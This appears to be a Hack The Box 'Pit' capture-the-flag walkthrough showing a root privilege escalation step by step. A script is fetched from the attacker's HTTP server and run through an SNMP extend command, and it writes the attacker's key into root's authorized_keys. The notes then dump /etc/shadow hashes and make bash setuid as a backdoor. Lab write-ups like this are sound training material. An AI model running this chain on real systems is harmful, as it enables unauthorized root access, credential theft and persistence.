@@ -1,0 +1,298 @@
+Genrate the key:
+
+    Quote:
+    kali@kali:~/HackTheBox/pit/test$ ssh-keygen
+    Generating public/private rsa key pair.
+    Enter file in which to save the key (/home/kali/.ssh/id_rsa): joker
+    Enter passphrase (empty for no passphrase):
+    Enter same passphrase again:
+    Your identification has been saved in joker
+    Your public key has been saved in joker.pub
+    The key fingerprint is:
+    SHA256:cc7ufk4+0r3pTrtnu2iA0QyW2O1jrTtgf4Az/YGu2d0 kali@kali
+    The key's randomart image is:
+    +---[RSA 3072]----+
+    |        o o      |
+    |      . = .    |
+    |        o * .    |
+    |        * * .  |
+    |        S O +    |
+    |        O * .  |
+    |        . B.*.o  |
+    |        .+B==+oo|
+    |        ++=**BEo|
+    +----[SHA256]-----+
+    kali@kali:~/HackTheBox/pit/test$
+
+Create a check_me.sh script on your local machine:
+
+    Quote:
+    #!/bin/bash
+
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfEx0d+z6xSjhzEu52h3JTGY/z8DXLvn+tBV6pdhDU0nkXZGg13eNGK1V/GW4lo6MpSXRQf<----snip----->aV6CLf3ENmQm8aeUiL1M= kali@kali" > /root/.ssh/authorized_keys
+
+Now send this file over to victim machine in directory /usr/bin/monitoring
+
+    Quote:
+    [michelle@pit monitoring]$ pwd
+    /usr/local/monitoring
+    [michelle@pit monitoring]$
+    [michelle@pit monitoring]$ curl http://10.10.14.24:8000/check_me.sh -o check_me.sh
+      % Total    % Received % Xferd  Average Speed  Time    Time    Time  Current
+                                    Dload  Upload  Total  Spent    Left  Speed
+    100  614  100  614    0    0    995      0 --:--:-- --:--:-- --:--:--  995
+    [michelle@pit monitoring]$ cat check_me.sh
+    #!/bin/bash
+    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfEx0d+z6xSjhzEu52h3JTGY/z8DXLvn+tBV6pdhDU0nkXZGg13eNGK1V/GW4lo6MpSXRQf<-----snip----->aV6CLf3ENmQm8aeUiL1M= kali@kali" > /root/.ssh/authorized_keys
+
+Now run the snmp walk command on your local machine:
+
+    Quote:
+    kali@kali:~/HackTheBox/pit$ snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
+
+If this commands error out run the below command and run the above command again:
+
+    Quote:
+    sudo apt-get install snmp-mibs-downloader
+
+Then try and login in with your private key as root:
+
+    Quote:
+    kali@kali:~/HackThe0 joker
+    kali@kali:~/HackTheBox/pit$ ssh -i joker root@pit.htb
+    Web console: https://pit.htb:9090/
+
+    Last login: Tue May 11 04:44:50 2021
+    [root@pit ~]# id
+    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+......................................................................................................................................................................................................
+
+┌──(kali㉿Linux)-[~/Desktop]
+└─$ ssh-keygen                    
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): joker
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in joker
+Your public key has been saved in joker.pub
+The key fingerprint is:
+SHA256:cmnmQIfS3q/zq0edIdBUAoq3RRq7GW9Gy+0JPWNsNZQ kali@Linux
+The key's randomart image is:
++---[RSA 3072]----+
+|      . o+o.o.   |
+|     o B. .oE    |
+|    o X +.  o    |
+|     = % *....   |
+|      B S Oo o   |
+|       X *.+o    |
+|        ..+      |
+|        ...      |
+|        o=o.     |
++----[SHA256]-----+
+
+
+┌──(kali㉿Linux)-[~/Desktop]
+└─$ cat joker.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6LY9Ks5FI0mFzz7tmt0lqXsZC5fy+AhoLjpEi20BHnKB4/jbR1UUx66t/WqORo920Q65li7YRGJROHktc5zppR3bKKmESsajJ/tYX2uwWUxkP0VYZu8E8+Lq+gzaf4p/v60cG8apuCmdOzWWyxvo9xgTQkX2YXGWChWhduuTVVOeGmbDt11aZzwcPZ3PB/ExYxKf/ZnTXhJ38KmilySSsBdCnRr1yO/CStpiytJhLJqP63/gL8XUY5x/A379SNX8vHMi+G8WBWP2IxWS2px2jTJ4FUyaJTiLm/9w7fcZsDGM0UmLnkmCeOW/pyWs+Qal9x6ZZGxi+BToxk/UnpfRf/Dp9cOCT1Uq7bB4UIAo6y1sgc7p/64dUGchnH+dTR66cj0PdbVhFL4yOALNM4QtuTnIaq7M7DH5Bgaek9DcVjqEqLeWJPSAEN6K65LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux
+                                                                                                                                               
+┌──(kali㉿Linux)-[~/Desktop]
+└─$ mousepad check.sh  (create a bash script)....👇️
+
+┌──(kali㉿Linux)-[~/Desktop]
+└─$ cat check.sh 
+#!/bin/bash
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6LY9Ks5FI0mFzz7tmt0lqXsZC5fy+AhoLjpEi20BHnKB4/jbR1UUx66t/WqORo920Q65li7YRGJROHktc5zppR3bKKmESsajJ/tYX2uwWUxkP0VYZu8E8+Lq+gzaf4p/v60cG8apuCmdOzWWyxvo9xgTQkX2YXGWChWhduuTVVOeGmbDt11aZzwcPZ3PB/ExYxKf/ZnTXhJ38KmilySSsBdCnRr1yO/CStpiytJhLJqP63/gL8XUY5x/A379SNX8vHMi+G8WBWP2IxWS2px2jTJ4FUyaJTiLm/9w7fcZsDGM0UmLnkmCeOW/pyWs+Qal9x6ZZGxi+BToxk/UnpfRf/Dp9cOCT1Uq7bB4UIAo6y1sgc7p/64dUGchnH+dTR66cj0PdbVhFL4yOALNM4QtuTnIaq7M7DH5Bgaek9DcVjqEqLeWJPSAEN6K65LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux" > /root/.ssh/authorized_keys
+
+
+┌──(kali㉿Linux)-[~/Desktop]
+└─$ sudo python3 -m http.server 80
+Password: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+
+(***) Victem Machine:
+
+
+[michelle@pit ~]$ cd /usr/local/monitoring/
+[michelle@pit monitoring]$ curl http://10.10.16.12/check.sh -o check.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   613  100   613    0     0    477      0  0:00:01  0:00:01 --:--:--   477
+[michelle@pit monitoring]$ cat check.sh
+#!/bin/bash
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd3NZiNcpyRU6oXUFkD1fgCPwCWajBFXqQeNXdh3O6LY9Ks5FI0mFzz7tmt0lqXsZC5fy+AhoLjpEi20BHnKB4/jbR1UUx66t/WqORo920Q65li7YRGJROHktc5zppR3bKKmESsajJ/tYX2uwWUxkP0VYZu8E8+Lq+gzaf4p/v60cG8apuCmdOzWWyxvo9xgTQkX2YXGWChWhduuTVVOeGmbDt11aZzwcPZ3PB/ExYxKf/ZnTXhJ38KmilySSsBdCnRr1yO/CStpiytJhLJqP63/gL8XUY5x/A379SNX8vHMi+G8WBWP2IxWS2px2jTJ4FUyaJTiLm/9w7fcZsDGM0UmLnkmCeOW/pyWs+Qal9x6ZZGxi+BToxk/UnpfRf/Dp9cOCT1Uq7bB4UIAo6y1sgc7p/64dUGchnH+dTR66cj0PdbVhFL4yOALNM4QtuTnIaq7M7DH5Bgaek9DcVjqEqLeWJPSAEN6K65LfcNTio8mTO3eRkD9x8T3dDuAcgnkU= kali@Linux" > /root/.ssh/authorized_keys
+
+
+(***) My Machine:
+
+
+                                                                                                                                               
+┌──(kali㉿Linux)-[~]
+└─$ snmpwalk -m +MY-MIB -v2c -c public 10.10.10.241 nsExtendObjects
+MIB search path: /home/kali/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
+Cannot find module (MY-MIB): At line 1 in (none)
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Memory usage
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
+              total        used        free      shared  buff/cache   available
+Mem:          3.8Gi       409Mi       2.6Gi       8.0Mi       816Mi       3.2Gi
+Swap:         1.9Gi          0B       1.9Gi
+Database status
+OK - Connection to database successful.
+System release info
+CentOS Linux release 8.3.2011
+SELinux Settings
+user
+
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+
+guest_u         user       s0         s0                             guest_r
+root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+user_u          user       s0         s0                             user_r
+xguest_u        user       s0         s0                             xguest_r
+login
+
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         s0-s0:c0.c1023       *
+michelle             user_u               s0                   *
+root                 unconfined_u         s0-s0:c0.c1023       *
+System uptime
+ 09:46:59 up  4:40,  1 user,  load average: 0.05, 0.02, 0.00
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."monitoring" = INTEGER: 31
+NET-SNMP-EXTEND-MIB::nsExtendResult."monitoring" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".1 = STRING: Memory usage
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".2 = STRING:               total        used        free      shared  buff/cache   available
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".3 = STRING: Mem:          3.8Gi       409Mi       2.6Gi       8.0Mi       816Mi       3.2Gi
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".4 = STRING: Swap:         1.9Gi          0B       1.9Gi
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".5 = STRING: Database status
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".6 = STRING: OK - Connection to database successful.
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".7 = STRING: System release info
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".8 = STRING: CentOS Linux release 8.3.2011
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".9 = STRING: SELinux Settings
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".10 = STRING: user
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".11 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".12 = STRING:                 Labeling   MLS/       MLS/                          
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".13 = STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".14 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".15 = STRING: guest_u         user       s0         s0                             guest_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".16 = STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".17 = STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".18 = STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".19 = STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".20 = STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".21 = STRING: user_u          user       s0         s0                             user_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".22 = STRING: xguest_u        user       s0         s0                             xguest_r
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".23 = STRING: login
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".24 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".25 = STRING: Login Name           SELinux User         MLS/MCS Range        Service
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".26 = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".27 = STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".28 = STRING: michelle             user_u               s0                   *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".29 = STRING: root                 unconfined_u         s0-s0:c0.c1023       *
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".30 = STRING: System uptime
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".31 = STRING:  09:47:26 up  4:40,  2 users,  load average: 0.17, 0.05, 0.01
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."monitoring".31 = No more variables left in this MIB View (It is past the end of the MIB tree)
+     
+
+┌──(kali㉿Linux)-[~/Desktop]
+└─$ ssh -i joker root@pit.htb
+Web console: https://pit.htb:9090/
+
+Last login: Thu May 20 05:52:35 2021 from 10.10.14.102
+[root@pit ~]# whoami;id
+root
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+[root@pit ~]# cat root.txt
+c9356907b2c55d5c90162075210ba020
+
+[root@pit ~]# cat /etc/shadow
+root:$6$4ZnZ0Iv3NzFIZtKa$tA78wgAwaBBSg96ecMRPYIogQmANo/9pJhHmf06bCmbKukMDM9rdT2Mdc6UhwD1raDzXIrk.zjQ9lkJIoLShE.:18757:0:99999:7:::
+bin:*:18264:0:99999:7:::
+daemon:*:18264:0:99999:7:::
+adm:*:18264:0:99999:7:::
+lp:*:18264:0:99999:7:::
+sync:*:18264:0:99999:7:::
+shutdown:*:18264:0:99999:7:::
+halt:*:18264:0:99999:7:::
+mail:*:18264:0:99999:7:::
+operator:*:18264:0:99999:7:::
+games:*:18264:0:99999:7:::
+ftp:*:18264:0:99999:7:::
+nobody:*:18264:0:99999:7:::
+dbus:!!:18368::::::
+systemd-coredump:!!:18368::::::
+systemd-resolve:!!:18368::::::
+tss:!!:18368::::::
+polkitd:!!:18368::::::
+unbound:!!:18368::::::
+sssd:!!:18368::::::
+chrony:!!:18368::::::
+sshd:!!:18368::::::
+michelle:$6$hBsV4t2c9NMnABDe$.4cAMWqwmYPobZdusViisVwuafxDBSptElF1pFyg8O0ypF8DKoiqzYU9EfBx8H/gnTUGPMxEoxoc35rZWZDYn.:18370:0:99999:7:::
+setroubleshoot:!!:18368::::::
+cockpit-ws:!!:18368::::::
+mysql:!!:18368::::::
+nginx:!!:18368::::::
+apache:!!:18368::::::
+cockpit-wsinstance:!!:18757::::::
+rngd:!!:18757::::::
+
+[root@pit ~]# ls -la
+total 28
+dr-xr-x---.  6 root root 239 May 20 06:26 .
+drwxr-xr-x. 17 root root 234 May 20 06:24 ..
+lrwxrwxrwx.  1 root root   9 May 10 10:56 .bash_history -> /dev/null
+-rw-r--r--.  1 root root  18 May 11  2019 .bash_logout
+-rw-r--r--.  1 root root 176 May 11  2019 .bash_profile
+-rw-r--r--.  1 root root 176 May 11  2019 .bashrc
+-rwx------.  1 root root 706 Apr 22  2020 cleanup.sh
+drwx------.  3 root root  20 Apr 17  2020 .config
+-rw-r--r--.  1 root root 100 May 11  2019 .cshrc
+drwx------.  2 root root  44 May 20 06:26 .gnupg
+drwx------.  2 root root 122 Apr 18  2020 monitoring
+lrwxrwxrwx.  1 root root   9 May 10 10:56 .mysql_history -> /dev/null
+lrwxrwxrwx.  1 root root   9 May 10 11:07 null -> /dev/null
+-r--------.  1 root root  33 May 20 05:07 root.txt
+drwx------.  2 root root  29 Apr 18  2020 .ssh
+-rw-r--r--.  1 root root 129 May 11  2019 .tcshrc
+
+[root@pit ~]# cd .ssh
+
+[root@pit .ssh]# ls -la
+total 4
+drwx------. 2 root root  29 Apr 18  2020 .
+dr-xr-x---. 6 root root 239 May 20 06:26 ..
+-rw-r--r--. 1 root root 564 May 20 09:47 authorized_keys
+
+[root@pit .ssh]# chmod +s /bin/bash
+
+[root@pit .ssh]# cd
+
+[root@pit ~]# hostname
+pit.htb
+
+[root@pit ~]# cat /home/michelle/user.txt
+7df3640e254ebf06a10a69ffed11976d
+
+
+
+
+
